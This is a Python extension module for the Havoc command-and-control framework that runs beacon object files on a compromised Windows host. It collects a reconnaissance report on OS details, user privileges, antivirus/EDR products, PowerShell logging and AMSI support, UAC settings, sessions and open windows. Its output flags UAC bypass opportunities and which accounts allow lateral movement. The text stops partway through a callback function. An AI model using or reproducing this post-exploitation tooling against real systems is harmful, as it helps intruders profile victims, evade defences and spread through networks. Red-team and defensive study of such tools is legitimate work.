from havoc import Demon, RegisterCommand
import json
import re
import os

def ipconfig_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/ipconfig.{demon.ProcessArch}.o", b'' )

def uptime_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/uptime.{demon.ProcessArch}.o", b'' )

def whoami_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/whoami.{demon.ProcessArch}.o", b'' )

def windowlist_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/windowlist.{demon.ProcessArch}.o", b'' )

def reg_query_parse_params( demon, params ):
    packer = Packer()

    reghives = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU': 3
    }

    num_params = len(params)
    params_parsed = 0

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameters" )
        return None

    if num_params > 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if params[ params_parsed ].upper() not in reghives:
        hostname = params[ params_parsed ]
        params_parsed += 1
    else:
        hostname = None

    if params[ params_parsed ].upper() not in reghives:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Provided registry hive value is invalid" )
        return None

    hive = reghives[ params[ params_parsed ].upper() ]
    params_parsed += 1

    if num_params < params_parsed + 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameters" )
        return None

    path = params[ params_parsed ]
    params_parsed += 1

    if num_params > params_parsed:
        key = params[ params_parsed ]
    else:
        key = None

    packer.addstr(hostname)
    packer.adduint32(hive)
    packer.addstr(path)
    packer.addstr(key)
    packer.addbool(False) # recursive

    return packer.getbuffer()

def reg_query_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = reg_query_parse_params( demon, params )
    if packed_params is None:
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/reg_query.{demon.ProcessArch}.o", packed_params )

def wmi_query_parse_params( demon, params ):
    packer = Packer()

    query     = ''
    server    = '.'
    namespace = 'root\\cimv2'

    num_params = len(params)

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameters" )
        return None

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    query = params[ 0 ]

    if num_params > 1:
        server = params[ 1 ]

    if num_params > 2:
        namespace = params[ 2 ]

    resource = f"\\\\{server}\\{namespace}"

    packer.addWstr(server)
    packer.addWstr(namespace)
    packer.addWstr(query)
    packer.addWstr(resource)

    return packer.getbuffer()

def wmi_query_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = wmi_query_parse_params( demon, params )
    if packed_params is None:
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/wmi_query.{demon.ProcessArch}.o", packed_params )

def env_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/env.{demon.ProcessArch}.o", b'' )

def enumlocalsessions_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    num_params = len(params)

    if num_params > 0:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/enumlocalsessions.{demon.ProcessArch}.o", b'' )

def userenum_parse_parans( demon, params ):
    packer = Packer()

    num_params = len(params)

    enumtype = {
        'all': 1,
        'locked': 2,
        'disabled': 3,
        'active': 4
    }

    _type = enumtype[ 'all' ]

    if num_params == 1:
        if params[ 0 ].lower() not in enumtype:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Parameter not in: [all, locked, disabled, active]" )
            return None
        _type = enumtype[ params[ 0 ].lower() ]
    elif num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    packer.adduint32(0)
    packer.adduint32(_type)

    return packer.getbuffer()

def userenum_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = userenum_parse_parans( demon, params )
    if packed_params is None:
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/netuserenum.{demon.ProcessArch}.o", packed_params )

def bofdir_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    targetdir  = '.\\'
    subdirs    = 0

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params > 0:
        targetdir = params[0]

    if num_params == 2 and params[1] != '/s':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid parameter: {params[1]}" )
        return None

    if num_params == 2 and params[1] == '/s':
        subdirs = 1

    packer.addWstr(targetdir)
    packer.addshort(subdirs)

    return packer.getbuffer()

def bofdir( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = bofdir_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to list a directory" )

    demon.InlineExecute( TaskID, "go", f"ObjectFiles/dir.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

def bofdir_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = bofdir_parse_params( demon, params )
    if packed_params is None:
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/dir.{demon.ProcessArch}.o", packed_params )

def tasklist_parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    hostname   = ''

    if num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params > 0:
        hostname = params[0]

    packer.addWstr(hostname)

    return packer.getbuffer()

def tasklist( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = tasklist_parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon list running processes" )

    demon.InlineExecute( TaskID, "go", f"ObjectFiles/tasklist.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

def tasklist_with_callback( demonID, callback, *params ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = tasklist_parse_params( demon, params )
    if packed_params is None:
        return False

    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/tasklist.{demon.ProcessArch}.o", packed_params )

def callback_output_failed(bof_output):
    return bof_output['worked'] is False or bof_output['error'] != '' or bof_output['output'] == ''

def os_info(bof_output):
    info = {}

    bof_num = 0

    if callback_output_failed(bof_output[bof_num]):
        info['ProductName'] = '?'
    else:
        info['ProductName'] = bof_output[bof_num]['output'].split('REG_SZ')[1].strip()

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['ReleaseId'] = '?'
    else:
        info['ReleaseId'] = bof_output[bof_num]['output'].split(' ')[-1].strip()

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['CurrentMajorVersionNumber'] = '?'
    else:
        info['CurrentMajorVersionNumber'] = bof_output[bof_num]['output'].split(' ')[-1].strip()

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['CurrentVersion'] = '?'
    else:
        info['CurrentVersion'] = bof_output[bof_num]['output'].split(' ')[-1].strip()

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['CurrentBuildNumber'] = '?'
    else:
        info['CurrentBuildNumber'] = bof_output[bof_num]['output'].split(' ')[-1].strip()

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['arch'] = '?'
    else:
        match = re.search(r'PROCESSOR_ARCHITECTURE=(.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['arch'] = match.group(1)
        else:
            info['arch'] = '?'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['ip'] = '?'
        info['DNS'] = '?'
    else:
        match = re.search(r'\s+(.+)\nHostname:', bof_output[bof_num]['output'], re.MULTILINE)
        if match is not None:
            info['ip'] = match.group(1)
        else:
            info['ip'] = '?'

        match = re.search(r'DNS Server:\s+(.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['DNS'] = match.group(1)
        else:
            info['DNS'] = '?'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['Domain'] = '?'
    else:
        match = re.search(r'Domain\n(.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['Domain'] = match.group(1)
        else:
            info['Domain'] = '?'

    bof_num += 1

    info['manufacturer'] = '?'
    info['model'] = '?'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['uptime'] = '?'
    else:
        match = re.search(r'Uptime: (.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['uptime'] = match.group(1)
        else:
            info['uptime'] = '?'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['PPL'] = False
    else:
        info['PPL'] = bof_output[bof_num]['output'].split(' ')[-1].strip() == '1'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['AppLocker'] = False
    else:
        info['AppLocker'] = re.search(r'EnforcementMode *REG_DWORD *1', bof_output[bof_num]['output']) is not None

    return info

def user_info(bof_output):
    info = {}

    bof_num = 12

    if callback_output_failed(bof_output[bof_num]):
        info['username'] = '?'
        info['integrity'] = '?'
        info['groups'] = ['?']
        info['isLocalAdmin'] = '?'
        info['privs'] = ['?']
        info['isadmin'] = '?'
    else:
        match = re.search(r'UserName\s+SID\s*\n[=\s]+\n(.*?)\s*S-', bof_output[bof_num]['output'])
        if match is not None:
            info['username'] = match.group(1)
        else:
            info['username'] = '?'

        match = re.search(r'Mandatory Label\\(\S+)', bof_output[bof_num]['output'])
        if match is not None:
            info['integrity'] = match.group(1)
        else:
            info['integrity'] = '?'

        info['groups'] = re.findall(r'^(.+?)\s*(?:Well-known group|Group|Alias)',  bof_output[bof_num]['output'], re.MULTILINE)
        info['isLocalAdmin'] = 'S-1-5-32-544' in  bof_output[bof_num]['output']
        info['privs'] = re.findall(r'(Se\S*).*Enabled\s*', bof_output[bof_num]['output'])
        info['isadmin'] = False # TODO: add

    return info

def ps_info(bof_output):
    info = {}

    bof_num = 13

    info['CLRs'] = []
    info['versions'] = []

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v1.0.3705')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v1.1.4322')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v2.0.50727')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v3.0')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v3.5')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['CLRs'].append('v4.0.30319')

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['versions'].append(bof_output[bof_num]['output'].split('REG_SZ')[1].strip())

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        info['versions'].append(bof_output[bof_num]['output'].split('REG_SZ')[1].strip())

    bof_num += 1

    # TODO: test these regexes in a Windows machine with logging enabled
    if callback_output_failed(bof_output[bof_num]):
        info['EnableTranscripting'] = False
    else:
        match = re.search(r'EnableTranscripting\s+\w+\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableTranscripting'] = int(match.group(1)) == 1
        else:
            info['EnableTranscripting'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['EnableInvocationHeader'] = False
    else:
        match = re.search(r'EnableInvocationHeader\s+\w+\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableInvocationHeader'] = int(match.group(1)) == 1
        else:
            info['EnableInvocationHeader'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['EnableModuleLogging'] = False
    else:
        match = re.search(r'EnableModuleLogging\s+\w+\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableModuleLogging'] = int(match.group(1)) == 1
        else:
            info['EnableModuleLogging'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['EnableScriptBlockLogging'] = False
    else:
        match = re.search(r'EnableScriptBlockLogging\s+\w+\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableScriptBlockLogging'] = int(match.group(1)) == 1
        else:
            info['EnableScriptBlockLogging'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['EnableScriptBlockInvocationLogging'] = False
    else:
        match = re.search(r'EnableScriptBlockInvocationLogging\s+\w+\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableScriptBlockInvocationLogging'] = int(match.group(1)) == 1
        else:
            info['EnableScriptBlockInvocationLogging'] = False

    return info

def dotnet_info(bof_output):
    info = {}

    info['CLR'] = {}
    info['.NET'] = {}
    info['CLR']['versions'] = []
    info['.NET']['versions'] = []

    bof_num = 26

    if callback_output_failed(bof_output[bof_num]):
        info['CLR']['versions'] = ['?']
    else:
        info['CLR']['versions'] = re.findall(r'<dir> (v.*)', bof_output[bof_num]['output'])

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        match = re.search(r'\s+Version\s+REG_SZ\s+(.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['.NET']['versions'].append(match.group(1))

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]) is False:
        match = re.search(r'\s+Version\s+REG_SZ\s+(.*)', bof_output[bof_num]['output'])
        if match is not None:
            info['.NET']['versions'].append(match.group(1))

    return info

def avedr_info(bof_output):
    info = {}

    bof_num = 29

    if callback_output_failed(bof_output[bof_num]):
        info['AVs'] = []
    else:
        data = bof_output[bof_num]['output'].split('\n')[1:]
        info['AVs'] = [entry.split(',')[0] for entry in data if entry != '']

    return info

def processes_info(bof_output):
    info = {}

    bof_num = 30

    info['names'] = []
    info['browser']     = []
    info['interesting'] = []
    info['defensive']   = []

    if callback_output_failed(bof_output[bof_num]) is False:
        data = bof_output[bof_num]['output']
        data = data.split('\n')[1:]
        for entry in data:
            match = re.search(r'^(.*?)\s+\d', entry)
            if match is not None:
                info['names'].append(match.group(1))

        proctypes = ['browser', 'interesting', 'defensive']
        for proctype in proctypes:
            info[proctype] = {}
            with open(os.path.join(os.path.dirname(os.path.realpath('__file__')), 'client/Modules/Bofbelt/', f'{proctype}.json')) as f:
                j = json.load(f)
            for type_example in j:
                for proc in info['names']:
                    if type_example == proc.replace('.exe', ''):
                        info[proctype][proc] = j[type_example]

    return info

def uac_info(bof_output):
    info = {}

    bof_num = 31

    if callback_output_failed(bof_output[bof_num]):
        info['ConsentPromptBehaviorAdmin'] = '?'
    else:
        match = re.search(r'ConsentPromptBehaviorAdmin\s+REG_DWORD\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['ConsentPromptBehaviorAdmin'] = int(match.group(1))
        else:
            info['ConsentPromptBehaviorAdmin'] = '?'

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['EnableLUA'] = False
    else:
        match = re.search(r'EnableLUA\s+REG_DWORD\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['EnableLUA'] = int(match.group(1)) == 1
        else:
            info['EnableLUA'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['LocalAccountTokenFilterPolicy'] = False
    else:
        match = re.search(r'LocalAccountTokenFilterPolicy\s+REG_DWORD\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['LocalAccountTokenFilterPolicy'] = int(match.group(1)) == 1
        else:
            info['LocalAccountTokenFilterPolicy'] = False

    bof_num += 1

    if callback_output_failed(bof_output[bof_num]):
        info['FilterAdministratorToken'] = False
    else:
        match = re.search(r'FilterAdministratorToken\s+REG_DWORD\s+(\d+)', bof_output[bof_num]['output'])
        if match is not None:
            info['FilterAdministratorToken'] = int(match.group(1)) == 1
        else:
            info['FilterAdministratorToken'] = False

    return info

def local_users_info(bof_output):
    info = {}

    bof_num = 35

    if callback_output_failed(bof_output[bof_num]):
        info['local_users'] = ['?']
    else:
        info['local_users'] = re.findall(rf'^-- (.*)$', bof_output[bof_num]['output'], re.MULTILINE)

    return info

def local_sessions_info(bof_output):
    info = {}

    bof_num = 36

    if callback_output_failed(bof_output[bof_num]):
        info['local_sessions'] = None
    else:
        info['local_sessions'] = re.findall(r'^  - \[\d\] (.*?)$', bof_output[bof_num]['output'], re.MULTILINE)

    return info

def open_windows_info(bof_output):
    info = {}

    bof_num = 37

    if callback_output_failed(bof_output[bof_num]):
        info['open_windows'] = None
    else:
        data = bof_output[bof_num]['output']
        data = data.split('\n')
        info['open_windows'] = [entry for entry in data if entry != '']

    return info

def bofbelt_report( demonID, bof_output ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    #print(json.dumps(bof_output, indent=2))

    report = {}

    try:
        report['os']             = os_info(bof_output)
        report['user']           = user_info(bof_output)
        report['ps']             = ps_info(bof_output)
        report['dotnet']         = dotnet_info(bof_output)
        report['avedr']          = avedr_info(bof_output)
        report['processes']      = processes_info(bof_output)
        report['uac']            = uac_info(bof_output)
        report['local_users']    = local_users_info(bof_output)
        report['local_sessions'] = local_sessions_info(bof_output)
        report['open_windows']   = open_windows_info(bof_output)
        #print(json.dumps(report, indent=2))
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Failed to parse BOF data: {e}" )
        return True

    # OS

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, "OS Information" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"OS           : {report['os']['ProductName']}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Version      : max:{report['os']['CurrentMajorVersionNumber']}, min:{report['os']['CurrentVersion']}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Build        : {report['os']['CurrentBuildNumber']}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"OS Arch      : {'x64' if report['os']['arch'] == 'AMD64' else 'x86'}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Process Arch : {demon.ProcessArch}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"IP           : {report['os']['ip']}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"DNS          : {report['os']['DNS']}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Domain       : {demon.Domain if demon.Domain else 'Not joined'}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"PPL          : {'Enabled (!)' if report['os']['PPL'] else 'Disabled'}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"AppLocker    : {'Enabled (!)' if report['os']['AppLocker'] else 'Disabled'}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Error obtaining OS Information: {e}" )

    # user

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, "User Information" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Username        : {report['user']['username']}" )
        isLocalAdmin_text = 'Yes' if report['user']['isLocalAdmin'] else 'No'
        integrity_text = report['user']['integrity']
        if report['user']['isLocalAdmin'] and report['user']['integrity'] == 'Medium':
            integrity_text += '[!] In medium integrity but user is a local administrator - UAC can be bypassed.'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"IsLocalAdmin    : {isLocalAdmin_text}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Integrity Level : {integrity_text}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Group memberships" )
        for group in report['user']['groups']:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {group}' )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Privileges" )
        for priv in report['user']['privs']:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {priv}' )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'' )
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Error obtaining User Information: {e}" )

    # powershell

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, "PowerShell Information" )
        osSupportsAmsi = int(report['os']['CurrentMajorVersionNumber']) >= 10
        supported_text = 'Yes' if osSupportsAmsi else 'No'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"AMSI support: {supported_text}" )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"CLRs installed" )
        for clr in report['ps']['CLRs']:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {clr[1:]}' )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f"Versions installed" )
        for ver in report['ps']['versions']:
            if ver == '2.0':
                if 'v2.0.50727' not in report['ps']['CLRs']:
                    ver += ' [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won\'t be able to run.'
                elif osSupportsAmsi:
                    ver += ' [!] This version does not support AMSI'
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {ver}' )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'Transcription Logging Settings' )
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'    Enabled            : {report["ps"]["EnableTranscripting"]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'    Invocation Logging : {report["ps"]["EnableInvocationHeader"]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Module Logging Settings')
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'    Enabled            : {report["ps"]["EnableModuleLogging"]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Script Block Logging Settings')
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'    Enabled            : {report["ps"]["EnableScriptBlockLogging"]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'    Invocation Logging : {report["ps"]["EnableScriptBlockInvocationLogging"]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Error obtaining PowerShell Information: {e}" )

    # .NET

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, '.NET Information')
        latest_version = report['dotnet']['.NET']['versions'][-1]
        highestVersion_Major = int(latest_version.split('.')[0])
        highestVersion_Minor = int(latest_version.split('.')[1])
        supports_amsi = highestVersion_Major > 4 or (highestVersion_Major == 4 and highestVersion_Minor >= 8)
        supported_text = 'Yes' if supports_amsi else 'No'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'AMSI support: {supported_text}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'CLRs installed')
        for clr in report['ps']['CLRs']:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {clr[1:]}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '.NET versions installed')
        for ver in report['dotnet']['.NET']['versions']:
            high = int(ver.split('.')[0])
            low = int(ver.split('.')[1])
            if (high < 4 or (high == 4 and low < 8)) and supports_amsi:
                ver += ' [!] This version does not support AMSI'
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {ver}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining .NET Information: {e}')

    # AV/EDR

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, ('AVs/EDRs Information'))
        for name in report['avedr']['AVs']:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {name}')
        if len(report['avedr']['AVs']) == 0:
            demon.ConsoleWrite( demon.CONSOLE_INFO, '- None found')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining AVs/EDRs Information: {e}')

    # processes

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Processes Information')
        # TODO: add PID
        printed_data = False
        proctypes = ['browser', 'interesting', 'defensive']
        submenus = ['Browsers', 'Interesting processes', 'Defensive processes']
        for i in range(len(proctypes)):
            proctype = proctypes[i]
            submenu = submenus[i]
            if len(report['processes'][proctype]) == 0:
                continue
            demon.ConsoleWrite( demon.CONSOLE_INFO, submenu)
            for elem in report['processes'][proctype]:
                demon.ConsoleWrite( demon.CONSOLE_INFO, f' - {elem} -> {report["processes"][proctype][elem]}')
                printed_data = True
        if printed_data is False:
            demon.ConsoleWrite( demon.CONSOLE_INFO, '(No interesting processes found)')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining Processes Information: {e}')

    # UAC

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'UAC Information')
        meaning = {
            '': 'PromptForNonWindowsBinaries',
            0: 'No prompting',
            1: 'PromptOnSecureDesktop',
            2: 'PromptPermitDenyOnSecureDesktop',
            3: 'PromptForCredsNotOnSecureDesktop',
            4: 'PromptForPermitDenyNotOnSecureDesktop',
            5: 'PromptForNonWindowsBinaries'
        }
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'ConsentPromptBehaviorAdmin    : {report["uac"]["ConsentPromptBehaviorAdmin"]} - {meaning[report["uac"]["ConsentPromptBehaviorAdmin"]]}')
        text = 'Yes' if report['uac']['EnableLUA'] else 'No'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'EnableLUA (Is UAC enabled?)   : {text}')
        text = 'Yes' if report['uac']['LocalAccountTokenFilterPolicy'] else 'No'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'LocalAccountTokenFilterPolicy : {text}')
        text = 'Yes' if report['uac']['FilterAdministratorToken'] else 'No'
        demon.ConsoleWrite( demon.CONSOLE_INFO, f'FilterAdministratorToken      : {text}')
        if report['uac']['EnableLUA'] is False:
            demon.ConsoleWrite( demon.CONSOLE_INFO, '[*] UAC is disabled. Any administrative local account can be used for lateral movement.')
        else:
            if report['uac']['LocalAccountTokenFilterPolicy'] is False and report['uac']['FilterAdministratorToken'] is False:
                demon.ConsoleWrite( demon.CONSOLE_INFO, '[*] Default Windows settings - Only the RID-500 local admin account can be used for lateral movement.')
            elif report['uac']['LocalAccountTokenFilterPolicy'] is True:
                demon.ConsoleWrite( demon.CONSOLE_INFO, '[*] LocalAccountTokenFilterPolicy == 1. Any administrative local account can be used for lateral movement.')
            else:
                demon.ConsoleWrite( demon.CONSOLE_INFO, '[*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken == 1. Local accounts cannot be used for lateral movement.')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining UAC Information: {e}')

    # Local users

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Local Users Information')
        usernames = report['local_users']['local_users']
        num_users = len(usernames)
        max_num = 10
        if num_users > max_num:
            usernames = usernames[:max_num]
            demon.ConsoleWrite( demon.CONSOLE_INFO, f'Only showing {max_num} users of {num_users}. Run \'userenum\' to get the full list.')
        if num_users == 0:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f'No users found')
        for username in usernames:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f'  - {username}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining Local Users Information: {e}')

    # Local sessions

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Local Sessions Information')
        sessions = report['local_sessions']['local_sessions']
        if sessions is None:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f'(Failed to enumerate local sessions)')
        else:
            num_sessions = len(sessions)
            max_num = 10
            if num_sessions > max_num:
                sessions = sessions[:max_num]
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'Only showing {max_num} session of {num_sessions}. Run \'enumLocalSessions\' to get the full list.')
            if num_sessions == 0:
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'No sessions found')
            for session in sessions:
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'  - {session}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining Local Sessions Information: {e}')

    try:
        demon.ConsoleWrite( demon.CONSOLE_INFO, 'Open windows Information')
        windows = report['open_windows']['open_windows']
        if windows is None:
            demon.ConsoleWrite( demon.CONSOLE_INFO, f'(Failed to enumerate open windows)')
        else:
            num_windows = len(windows)
            max_num = 10
            if num_windows > max_num:
                windows = windows[:max_num]
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'Only showing {max_num} windows of {num_windows}. Run \'windowlist\' to get the full list.')
            if num_windows == 0:
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'No windows found')
            for window in windows:
                demon.ConsoleWrite( demon.CONSOLE_INFO, f'  - {window}')
        demon.ConsoleWrite( demon.CONSOLE_INFO, '')
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f'Error obtaining Open windows Information: {e}')

# this callback is triggered by every BOF
# demonID: the ID of the demon that ran the BOF
# TaskID : the ID of the task returned by demon.InlineExecuteGetOutput
# worked : weather the BOF was able to run or not
# output : the content of all CALLBACK_OUTPUT
# error  : the content of all CALLBACK_ERROR
def bofbelt_callback( demonID, TaskID, worked, output, error ):
    filename = f'/tmp/bofbelt-{demonID}.json'

    # first, get the json that contains all the previous BOF output
    try:
        with open(filename, 'r') as f:
